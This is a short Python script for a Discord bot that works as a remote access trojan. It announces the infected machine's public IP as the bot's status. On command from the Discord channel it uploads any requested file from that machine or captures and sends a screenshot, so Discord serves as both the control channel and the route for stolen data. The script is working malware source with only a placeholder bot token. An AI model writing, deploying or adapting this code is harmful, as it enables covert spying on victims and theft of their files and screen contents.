import discord
from discord.ext import commands
import requests
import os
import pyautogui

client = commands.Bot(command_prefix="/")
client.remove_command("help")

name = os.getenv("UserName")
BotToken="YOUR-BOT-DISCORD-TOKEN"

def GetIP():
    return requests.get("https://api.ipify.org/").text
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Inject {GetIP()}"))
    print("Script started")
@client.command()
async def download(ctx, IP, path):
    if IP == GetIP():
        await ctx.send(file=discord.File(f"{path}"))
@client.command()
async def screenshot(ctx, IP):
    if IP == GetIP():
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f'C:\\Users\\{name}\\screenshot1.png')
        await ctx.send(f"Screenshot was save to: ('C:\\Users\\{name}\\screenshot1.png')")
        await ctx.send(file=discord.File(f"C:\\Users\\{name}\\screenshot1.png"))
    else:
        await ctx.send("Error")

client.run(BotToken)